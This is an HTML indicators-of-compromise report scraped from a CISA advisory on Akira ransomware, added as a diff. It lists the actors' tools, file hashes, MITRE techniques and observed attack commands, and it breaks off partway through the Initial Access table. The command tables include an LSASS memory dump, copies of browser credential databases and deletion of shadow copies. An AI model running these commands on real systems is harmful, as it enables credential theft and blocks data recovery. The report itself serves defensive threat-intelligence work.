@@ -1,0 +1,1937 @@
+
+    <html>
+        <head>
+            <title>IOC Report - Akira Ransomware</title>
+            <style>
+                body { 
+                    font-family: Arial, sans-serif; 
+                    margin: 40px; 
+                    background-color: white !important;  /* Ensure white background */
+                    color: black !important;  /* Ensure text color is black */
+                }
+                h1 { color: #2E86C1 !important; }
+                h2 { color: #21618C !important; margin-bottom: 5px !important; }
+                p { font-size: 14px !important; line-height: 1.6 !important; margin-bottom: 15px !important; }
+                table { width: 100%; border-collapse: collapse; margin: 20px 0; background-color: white !important; color: black !important; }
+                th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
+                th { background-color: #f2f2f2 !important; }
+                td { background-color: white !important; color: black !important; }
+                .content-section { margin-bottom: 20px; }
+                .footer { font-size: 12px; color: #5D6D7E; margin-top: 40px; text-align: center; }
+            </style>
+        </head>
+        <body>
+            <h1>IOC Report: Akira Ransomware</h1>
+
+            <div class="content-section">
+                <h2>Extracted Tables</h2>
+                <table cellpadding="0" cellspacing="0" class="gsc-search-box" role="presentation"><tbody><tr><td class="gsc-input"><div class="gsc-input-box" id="gsc-iw-id1"><table cellpadding="0" cellspacing="0" class="gstl_50 gsc-input" id="gs_id50" role="presentation" style="width: 100%; padding: 0px;"><tbody><tr><td class="gsib_a" id="gs_tti50"><input aria-label="search" autocomplete="off" class="gsc-input" dir="ltr" id="gsc-i-id1" name="search" size="10" spellcheck="false" style="width: 100%; padding: 0px; border: medium; margin: 0px; height: auto; outline: none;" title="search" type="text"/></td><td class="gsib_b"><div class="gsst_b" dir="ltr" id="gs_st50"><span aria-hidden="true" class="gscb_a" id="gs_cb50">×</span></div></td></tr></tbody></table></div></td><td class="gsc-search-button"><button class="gsc-search-button gsc-search-button-v2"></button></td><td class="gsc-clear-button"><div class="gsc-clear-button" title="clear results"> </div></td></tr></tbody></table><br><br><p>Source: <a href='https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a'>https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a</a></p><br><table cellpadding="0" cellspacing="0" class="gstl_50 gsc-input" id="gs_id50" role="presentation" style="width: 100%; padding: 0px;"><tbody><tr><td class="gsib_a" id="gs_tti50"><input aria-label="search" autocomplete="off" class="gsc-input" dir="ltr" id="gsc-i-id1" name="search" size="10" spellcheck="false" style="width: 100%; padding: 0px; border: medium; margin: 0px; height: auto; outline: none;" title="search" type="text"/></td><td class="gsib_b"><div class="gsst_b" dir="ltr" id="gs_st50"><span aria-hidden="true" class="gscb_a" id="gs_cb50">×</span></div></td></tr></tbody></table><br><br><p>Source: <a href='https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a'>https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a</a></p><br><table cellpadding="0" cellspacing="0" class="gsc-search-box" role="presentation"><tbody><tr><td class="gsc-input"><div class="gsc-input-box" id="gsc-iw-id2"><table cellpadding="0" cellspacing="0" class="gstl_51 gsc-input" id="gs_id51" role="presentation" style="width: 100%; padding: 0px;"><tbody><tr><td class="gsib_a" id="gs_tti51"><input aria-label="search" autocomplete="off" class="gsc-input" dir="ltr" id="gsc-i-id2" name="search" size="10" spellcheck="false" style="width: 100%; padding: 0px; border: medium; margin: 0px; height: auto; outline: none;" title="search" type="text"/></td><td class="gsib_b"><div class="gsst_b" dir="ltr" id="gs_st51"><span aria-hidden="true" class="gscb_a" id="gs_cb51">×</span></div></td></tr></tbody></table></div></td><td class="gsc-search-button"><button class="gsc-search-button gsc-search-button-v2"></button></td><td class="gsc-clear-button"><div class="gsc-clear-button" title="clear results"> </div></td></tr></tbody></table><br><br><p>Source: <a href='https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a'>https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a</a></p><br><table cellpadding="0" cellspacing="0" class="gstl_51 gsc-input" id="gs_id51" role="presentation" style="width: 100%; padding: 0px;"><tbody><tr><td class="gsib_a" id="gs_tti51"><input aria-label="search" autocomplete="off" class="gsc-input" dir="ltr" id="gsc-i-id2" name="search" size="10" spellcheck="false" style="width: 100%; padding: 0px; border: medium; margin: 0px; height: auto; outline: none;" title="search" type="text"/></td><td class="gsib_b"><div class="gsst_b" dir="ltr" id="gs_st51"><span aria-hidden="true" class="gscb_a" id="gs_cb51">×</span></div></td></tr></tbody></table><br><br><p>Source: <a href='https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a'>https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a</a></p><br><caption>Table 1: Tools Leveraged by Akira Ransomware Actors</caption><table class="tablesaw tablesaw-stack" data-tablesaw-minimap="" data-tablesaw-mode="stack" id="tablesaw-7903">
+<caption><em>Table 1: Tools Leveraged by Akira Ransomware Actors</em></caption>
+<thead>
+<tr>
+<th data-tablesaw-priority="persist" role="columnheader"><strong>Name</strong></th>
+<th role="columnheader"><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Name</strong></strong> <span class="tablesaw-cell-content">AdFind</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Description</strong></strong> <span class="tablesaw-cell-content"><code>AdFind.exe</code> is used to query and retrieve information from Active Directory.</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Name</strong></strong> <span class="tablesaw-cell-content">Advanced IP Scanner</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Description</strong></strong> <span class="tablesaw-cell-content">A network scanner is used to locate all the computers on a network and conduct a scan of their ports. The program shows all network devices, gives access to shared folders, and provides remote control of computers (via RDP and Radmin).</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Name</strong></strong> <span class="tablesaw-cell-content">AnyDesk</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Description</strong></strong> <span class="tablesaw-cell-content">A common software that can be maliciously used by threat actors to obtain remote access and maintain persistence [T1219]. AnyDesk also supports remote file transfer.</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Name</strong></strong> <span class="tablesaw-cell-content">LaZagne</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Description</strong></strong> <span class="tablesaw-cell-content">Allows users to recover stored passwords on Windows, Linux, and OSX systems.</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Name</strong></strong> <span class="tablesaw-cell-content">PCHunter64</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Description</strong></strong> <span class="tablesaw-cell-content">A tool used to acquire detailed process and system information [T1082].[7]</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Name</strong></strong> <span class="tablesaw-cell-content">PowerShell</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Description</strong></strong> <span class="tablesaw-cell-content">A cross-platform task automation solution made up of a command line shell, a scripting language, and a configuration management framework, which runs on Windows, Linux, and macOS.</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Name</strong></strong> <span class="tablesaw-cell-content">Mimikatz</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Description</strong></strong> <span class="tablesaw-cell-content">Allows users to view and save authentication credentials such as Kerberos tickets.</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Name</strong></strong> <span class="tablesaw-cell-content">Ngrok</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Description</strong></strong> <span class="tablesaw-cell-content">A reverse proxy tool [T1090] used to create a secure tunnel to servers behind firewalls or local machines without a public IP address.</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Name</strong></strong> <span class="tablesaw-cell-content">RClone</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Description</strong></strong> <span class="tablesaw-cell-content">A command line program used to sync files with cloud storage services [T1567.002] such as Mega.</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Name</strong></strong> <span class="tablesaw-cell-content">SoftPerfect</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Description</strong></strong> <span class="tablesaw-cell-content">A network scanner (<code>netscan.exe</code>) used to ping computers, scan ports, discover shared folders, and retrieve information about network devices via Windows Management Instrumentation (WMI), Simple Network Management Protocol (SNMP), HTTP, Secure Shell (SSH) and PowerShell. It also scans for remote services, registry, files, and performance counters.</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Name</strong></strong> <span class="tablesaw-cell-content">WinRAR</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Description</strong></strong> <span class="tablesaw-cell-content">Used to split compromised data into segments and to compress [T1560.001] files into <code>.RAR</code> format for exfiltration.</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Name</strong></strong> <span class="tablesaw-cell-content">WinSCP</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Description</strong></strong> <span class="tablesaw-cell-content">Windows Secure Copy is a free and open source SSH File Transfer Protocol, File Transfer Protocol, WebDAV, Amazon S3, and secure copy protocol client. Akira threat actors have used it to transfer data [T1048] from a compromised network to actor-controlled accounts.</span></td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a'>https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a</a></p><br><caption>Table 2a: Malicious Files Affiliated with Akira Ransomware</caption><table class="tablesaw tablesaw-stack" data-tablesaw-minimap="" data-tablesaw-mode="stack" id="tablesaw-4705">
+<caption><em>Table 2a: Malicious Files Affiliated with Akira Ransomware</em></caption>
+<thead>
+<tr>
+<th data-tablesaw-priority="persist" role="columnheader"><strong>File Name</strong></th>
+<th role="columnheader"><strong>Hash (SHA-256)</strong></th>
+<th role="columnheader"><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>File Name</strong></strong> <span class="tablesaw-cell-content">w.exe</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Hash (SHA-256)</strong></strong> <span class="tablesaw-cell-content">d2fd0654710c27dcf37b6c1437880020824e161dd0bf28e3a133ed777242a0ca</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Description</strong></strong> <span class="tablesaw-cell-content">Akira ransomware</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>File Name</strong></strong> <span class="tablesaw-cell-content">Win.exe</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Hash (SHA-256)</strong></strong> <span class="tablesaw-cell-content">dcfa2800754e5722acf94987bb03e814edcb9acebda37df6da1987bf48e5b05e</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Description</strong></strong> <span class="tablesaw-cell-content">Akira ransomware encryptor</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>File Name</strong></strong> <span class="tablesaw-cell-content">AnyDesk.exe</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Hash (SHA-256)</strong></strong> <span class="tablesaw-cell-content">bc747e3bf7b6e02c09f3d18bdd0e64eef62b940b2f16c9c72e647eec85cf0138</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Description</strong></strong> <span class="tablesaw-cell-content">Remote desktop application</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>File Name</strong></strong> <span class="tablesaw-cell-content">Gcapi.dll</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Hash (SHA-256)</strong></strong> <span class="tablesaw-cell-content">73170761d6776c0debacfbbc61b6988cb8270a20174bf5c049768a264bb8ffaf</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Description</strong></strong> <span class="tablesaw-cell-content">DLL file that assists with the execution of AnyDesk.exe</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>File Name</strong></strong> <span class="tablesaw-cell-content">Sysmon.exe</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Hash (SHA-256)</strong></strong> <span class="tablesaw-cell-content">1b60097bf1ccb15a952e5bcc3522cf5c162da68c381a76abc2d5985659e4d386</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Description</strong></strong> <span class="tablesaw-cell-content">Ngrok tool for persistence</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>File Name</strong></strong> <span class="tablesaw-cell-content">Config.yml</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Hash (SHA-256)</strong></strong> <span class="tablesaw-cell-content">Varies by use</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Description</strong></strong> <span class="tablesaw-cell-content">Ngrok configuration file</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>File Name</strong></strong> <span class="tablesaw-cell-content">Rclone.exe</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Hash (SHA-256)</strong></strong> <span class="tablesaw-cell-content">aaa647327ba5b855bedea8e889b3fafdc05a6ca75d1cfd98869432006d6fecc9</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Description</strong></strong> <span class="tablesaw-cell-content">Exfiltration tool</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>File Name</strong></strong> <span class="tablesaw-cell-content">Winscp.rnd</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Hash (SHA-256)</strong></strong> <span class="tablesaw-cell-content">7d6959bb7a9482e1caa83b16ee01103d982d47c70c72fdd03708e2b7f4c552c4</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Description</strong></strong> <span class="tablesaw-cell-content">Network file transfer program</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>File Name</strong></strong> <span class="tablesaw-cell-content">WinSCP-6.1.2-Setup.exe</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Hash (SHA-256)</strong></strong> <span class="tablesaw-cell-content">36cc31f0ab65b745f25c7e785df9e72d1c8919d35a1d7bd4ce8050c8c068b13c</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Description</strong></strong> <span class="tablesaw-cell-content">Network file transfer program</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>File Name</strong></strong> <span class="tablesaw-cell-content">Akira_v2</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Hash (SHA-256)</strong></strong> <span class="tablesaw-cell-content">
+<p>3298d203c2acb68c474e5fdad8379181890b4403d6491c523c13730129be3f75</p>
+<p>0ee1d284ed663073872012c7bde7fac5ca1121403f1a5d2d5411317df282796c</p>
+</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Description</strong></strong> <span class="tablesaw-cell-content">Akira_v2 ransomware</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>File Name</strong></strong> <span class="tablesaw-cell-content">Megazord</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Hash (SHA-256)</strong></strong> <span class="tablesaw-cell-content">
+<p>ffd9f58e5fe8502249c67cad0123ceeeaa6e9f69b4ec9f9e21511809849eb8fc</p>
+<p>dfe6fddc67bdc93b9947430b966da2877fda094edf3e21e6f0ba98a84bc53198</p>
+<p>131da83b521f610819141d5c740313ce46578374abb22ef504a7593955a65f07</p>
+<p>9f393516edf6b8e011df6ee991758480c5b99a0efbfd68347786061f0e04426c</p>
+<p>9585af44c3ff8fd921c713680b0c2b3bbc9d56add848ed62164f7c9b9f23d065</p>
+<p>2f629395fdfa11e713ea8bf11d40f6f240acf2f5fcf9a2ac50b6f7fbc7521c83</p>
+<p>7f731cc11f8e4d249142e99a44b9da7a48505ce32c4ee4881041beeddb3760be</p>
+<p>95477703e789e6182096a09bc98853e0a70b680a4f19fa2bf86cbb9280e8ec5a</p>
+<p>0c0e0f9b09b80d87ebc88e2870907b6cacb4cd7703584baf8f2be1fd9438696d</p>
+<p>C9c94ac5e1991a7db42c7973e328fceeb6f163d9f644031bdfd4123c7b3898b0</p>
+</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Description</strong></strong> <span class="tablesaw-cell-content">Akira “Megazord” ransomware</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>File Name</strong></strong> <span class="tablesaw-cell-content">VeeamHax.exe</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Hash (SHA-256)</strong></strong> <span class="tablesaw-cell-content">aaa6041912a6ba3cf167ecdb90a434a62feaf08639c59705847706b9f492015d</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Description</strong></strong> <span class="tablesaw-cell-content">Plaintext credential leaking tool</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>File Name</strong></strong> <span class="tablesaw-cell-content">Veeam-Get-Creds.ps1</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Hash (SHA-256)</strong></strong> <span class="tablesaw-cell-content">18051333e658c4816ff3576a2e9d97fe2a1196ac0ea5ed9ba386c46defafdb88</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Description</strong></strong> <span class="tablesaw-cell-content">PowerShell script for obtaining and decrypting accounts from Veeam servers</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>File Name</strong></strong> <span class="tablesaw-cell-content">PowershellKerberos TicketDumper</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Hash (SHA-256)</strong></strong> <span class="tablesaw-cell-content">5e1e3bf6999126ae4aa52146280fdb913912632e8bac4f54e98c58821a307d32</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Description</strong></strong> <span class="tablesaw-cell-content">Kerberos ticket dumping tool from LSA cache</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>File Name</strong></strong> <span class="tablesaw-cell-content">sshd.exe</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Hash (SHA-256)</strong></strong> <span class="tablesaw-cell-content">8317ff6416af8ab6eb35df3529689671a700fdb61a5e6436f4d6ea8ee002d694</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Description</strong></strong> <span class="tablesaw-cell-content">OpenSSH Backdoor</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>File Name</strong></strong> <span class="tablesaw-cell-content">ipscan-3.9.1-setup.exe</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Hash (SHA-256)</strong></strong> <span class="tablesaw-cell-content">892405573aa34dfc49b37e4c35b655543e88ec1c5e8ffb27ab8d1bbf90fc6ae0</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Description</strong></strong> <span class="tablesaw-cell-content">Network scanner that scans IP addresses and ports</span></td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a'>https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a</a></p><br><caption>Table 2b: Malicious Files Affiliated with Akira Ransomware</caption><table class="tablesaw tablesaw-stack" data-tablesaw-minimap="" data-tablesaw-mode="stack" id="tablesaw-2410">
+<caption><em>Table 2b: Malicious Files Affiliated with Akira Ransomware</em></caption>
+<thead>
+<tr>
+<th data-tablesaw-priority="persist" role="columnheader"><strong>File Name</strong></th>
+<th role="columnheader"><strong>Hash (MD5)</strong></th>
+<th role="columnheader"><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>File Name</strong></strong> <span class="tablesaw-cell-content">winrar-x64-623.exe</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Hash (MD5)</strong></strong> <span class="tablesaw-cell-content">7a647af3c112ad805296a22b2a276e7c</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Description</strong></strong> <span class="tablesaw-cell-content">Network file transfer program</span></td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a'>https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a</a></p><br><caption>Table 3: Windows Akira Ransomware Samples</caption><table class="tablesaw tablesaw-stack" data-tablesaw-minimap="" data-tablesaw-mode="stack" id="tablesaw-1959">
+<caption><em>Table 3: Windows Akira Ransomware Samples</em></caption>
+<thead>
+<tr>
+<th data-tablesaw-priority="persist" role="columnheader"><strong>Hash (SHA-256)</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Hash (SHA-256)</strong></strong> <span class="tablesaw-cell-content">0b5b31af5956158bfbd14f6cbf4f1bca23c5d16a40dbf3758f3289146c565f43</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Hash (SHA-256)</strong></strong> <span class="tablesaw-cell-content">0d700ca5f6cc093de4abba9410480ee7a8870d5e8fe86c9ce103eec3872f225f</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Hash (SHA-256)</strong></strong> <span class="tablesaw-cell-content">a2df5477cf924bd41241a3326060cc2f913aff2379858b148ddec455e4da67bc</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Hash (SHA-256)</strong></strong> <span class="tablesaw-cell-content">03aa12ac2884251aa24bf0ccd854047de403591a8537e6aba19e822807e06a45</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Hash (SHA-256)</strong></strong> <span class="tablesaw-cell-content">2e88e55cc8ee364bf90e7a51671366efb3dac3e9468005b044164ba0f1624422</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Hash (SHA-256)</strong></strong> <span class="tablesaw-cell-content">40221e1c2e0c09bc6104548ee847b6ec790413d6ece06ad675fff87e5b8dc1d5</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Hash (SHA-256)</strong></strong> <span class="tablesaw-cell-content">5ea65e2bb9d245913ad69ce90e3bd9647eb16d992301145372565486c77568a2</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Hash (SHA-256)</strong></strong> <span class="tablesaw-cell-content">643061ac0b51f8c77f2ed202dc91afb9879f796ddd974489209d45f84f644562</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Hash (SHA-256)</strong></strong> <span class="tablesaw-cell-content">6f9d50bab16b2532f4683eeb76bd25449d83bdd6c85bf0b05f716a4b49584f84</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Hash (SHA-256)</strong></strong> <span class="tablesaw-cell-content">fef09b0aa37cbdb6a8f60a6bd8b473a7e5bffdc7fd2e952444f781574abccf64</span></td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a'>https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a</a></p><br><caption>Table 4: Linux/Unix Akira Ransomware Executable and Linkable Format (ELF) Samples</caption><table class="tablesaw tablesaw-stack" data-tablesaw-minimap="" data-tablesaw-mode="stack" id="tablesaw-8863">
+<caption><em>Table 4: Linux/Unix Akira Ransomware Executable and Linkable Format (ELF) Samples</em></caption>
+<thead>
+<tr>
+<th data-tablesaw-priority="persist" role="columnheader"><strong>Hash (SHA-256)</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Hash (SHA-256)</strong></strong> <span class="tablesaw-cell-content">e1321a4b2b104f31aceaf4b19c5559e40ba35b73a754d3ae13d8e90c53146c0f</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Hash (SHA-256)</strong></strong> <span class="tablesaw-cell-content">74f497088b49b745e6377b32ed5d9dfaef3c84c7c0bb50fabf30363ad2e0bfb1</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Hash (SHA-256)</strong></strong> <span class="tablesaw-cell-content">3d2b58ef6df743ce58669d7387ff94740ceb0122c4fc1c4ffd81af00e72e60a4</span></td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a'>https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a</a></p><br><caption>Table 5a: Commands Affiliated with Akira Ransomware</caption><table class="tablesaw tablesaw-stack" data-tablesaw-minimap="" data-tablesaw-mode="stack" id="tablesaw-5159">
+<caption><em>Table 5a: Commands Affiliated with Akira Ransomware</em></caption>
+<thead>
+<tr>
+<th data-tablesaw-priority="persist" role="columnheader"><strong>Persistence and Discovery</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Persistence and Discovery</strong></strong> <span class="tablesaw-cell-content">nltest /dclist: [T1018]</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Persistence and Discovery</strong></strong> <span class="tablesaw-cell-content">nltest /DOMAIN_TRUSTS [T1482]</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Persistence and Discovery</strong></strong> <span class="tablesaw-cell-content">net group “Domain admins” /dom [T1069.002]</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Persistence and Discovery</strong></strong> <span class="tablesaw-cell-content">net localgroup “Administrators” /dom [T1069.001]</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Persistence and Discovery</strong></strong> <span class="tablesaw-cell-content">tasklist [T1057]</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Persistence and Discovery</strong></strong> <span class="tablesaw-cell-content">rundll32.exe c:\Windows\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\windows\temp\lsass.dmp full [T1003.001]</span></td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a'>https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a</a></p><br><caption>Table 5b: Commands Affiliated with Akira Ransomware</caption><table class="tablesaw tablesaw-stack" data-tablesaw-minimap="" data-tablesaw-mode="stack" id="tablesaw-3471">
+<caption><em>Table 5b: Commands Affiliated with Akira Ransomware</em></caption>
+<thead>
+<tr>
+<th data-tablesaw-priority="persist" role="columnheader"><strong>Credential Access</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Credential Access</strong></strong> <span class="tablesaw-cell-content">
+<p>cmd.exe /Q /c esentutl.exe /y</p>
+<p>"C:\Users\&lt;username&gt;\AppData\Roaming\Mozilla\Firefox\Profiles\&lt;firefox_profile_id&gt;.default-release\key4.db" /d</p>
+<p>"C:\Users\&lt;username&gt;\AppData\Roaming\Mozilla\Firefox\Profiles\&lt;firefox_profile_id&gt;.default-release\key4.db.tmp”</p>
+<p><strong>Note: </strong>Used for accessing Firefox data.</p>
+</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Credential Access</strong></strong> <span class="tablesaw-cell-content">
+<p>cmd.exe /Q /c esentutl.exe /y</p>
+<p>"C:\Users\&lt;username&gt;\AppData\Local\Google\Chrome\User Data\Default\Login Data" /d</p>
+<p>"C:\Users\&lt;username&gt;\AppData\Local\Google\Chrome\User Data\Default\Login Data.tmp”</p>
+<p><strong>Note: </strong>Used for accessing Google Chrome data.</p>
+</span></td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a'>https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a</a></p><br><caption>Table 5c: Commands Affiliated with Akira Ransomware</caption><table class="tablesaw tablesaw-stack" data-tablesaw-minimap="" data-tablesaw-mode="stack" id="tablesaw-9989">
+<caption><em>Table 5c: Commands Affiliated with Akira Ransomware</em></caption>
+<thead>
+<tr>
+<th data-tablesaw-priority="persist" role="columnheader"><strong>Impact</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Impact</strong></strong> <span class="tablesaw-cell-content">powershell.exe -Command "Get-WmiObject Win32_Shadowcopy | Remove-WmiObject" [T1490]</span></td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a'>https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a</a></p><br><caption>Table 6: Initial Access</caption><table class="tablesaw tablesaw-stack" data-tablesaw-minimap="" data-tablesaw-mode="stack" id="tablesaw-1432">
+<caption><em>Table 6: Initial Access</em></caption>
+<thead>
+<tr>
+<th data-tablesaw-priority="persist" role="columnheader"><strong>Technique Title</strong></th>
+<th role="columnheader"><strong>ID</strong></th>
+<th role="columnheader"><strong>Use</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Technique Title</strong></strong> <span class="tablesaw-cell-content">Valid Accounts</span></td>
+<td><strong class="tablesaw-cell-label"><strong>ID</strong></strong> <span class="tablesaw-cell-content">T1078</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Use</strong></strong> <span class="tablesaw-cell-content">Akira threat actors obtain and abuse credentials of existing accounts as a means of gaining initial access.</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Technique Title</strong></strong> <span class="tablesaw-cell-content">Exploit Public Facing Application</span></td>
+<td><strong class="tablesaw-cell-label"><strong>ID</strong></strong> <span class="tablesaw-cell-content">T1190</span></td>
+<td><strong class="tablesaw-cell-label"><strong>Use</strong></strong> <span class="tablesaw-cell-content">Akira threat actors exploit vulnerabilities in internet-facing systems to gain access to systems.</span></td>
+</tr>
+<tr>
+<td><strong class="tablesaw-cell-label"><strong>Technique Title</strong></strong> <span class="tablesaw-cell-content">External Remote Services</span></td>
+<td><strong class="tablesaw-cell-label"><strong>ID</strong></strong> <span class="tablesaw-cell-content">T1133</span></td>
